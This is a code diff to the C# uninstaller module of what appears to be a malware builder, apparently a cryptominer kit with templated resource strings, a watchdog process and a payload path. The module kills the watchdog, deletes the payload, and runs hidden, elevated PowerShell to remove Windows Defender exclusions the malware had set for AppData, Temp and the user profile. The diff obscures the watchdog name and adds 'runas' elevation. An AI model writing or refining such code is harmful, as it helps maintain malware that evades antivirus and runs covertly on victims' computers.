@@ -2,6 +2,7 @@
 using System.IO;
 using System.Reflection;
 using System.Security.Cryptography;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Resources;
 using System.Threading;
@@ -14,17 +15,19 @@ using System.Management;
 using System.Windows.Forms;
 #endif
 
+[assembly: Guid("%Guid%")]
+
 public partial class Uninstaller
 {
-    public static string lb = RGetString("#LIBSPATH");
-    public static string bD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + lb;
+    public static string rlB = RGetString("#LIBSPATH");
+    public static string rbD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + rlB;
 
     public static void Main()
     {
 #if DefInstall
         try
         {
-            foreach (Process proc in Process.GetProcessesByName("sihost32"))
+            foreach (Process proc in Process.GetProcessesByName(RGetString("#WATCHDOG")))
             {
                 proc.Kill();
             }
@@ -107,7 +110,7 @@ public partial class Uninstaller
         Thread.Sleep(3000);
         try
         {
-            Directory.Delete(bD, true);
+            Directory.Delete(rbD, true);
 #if DefInstall
             File.Delete(PayloadPath);
 #endif
@@ -129,6 +132,7 @@ public partial class Uninstaller
                 Arguments = "/c powershell -Command Remove-MpPreference -ExclusionPath '%cd%' & powershell -Command Remove-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Remove-MpPreference -ExclusionPath '%AppData%' & powershell -Command Remove-MpPreference -ExclusionPath '%Temp%' & exit",
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
+                Verb = "runas"
             });
         }
         catch (Exception ex)
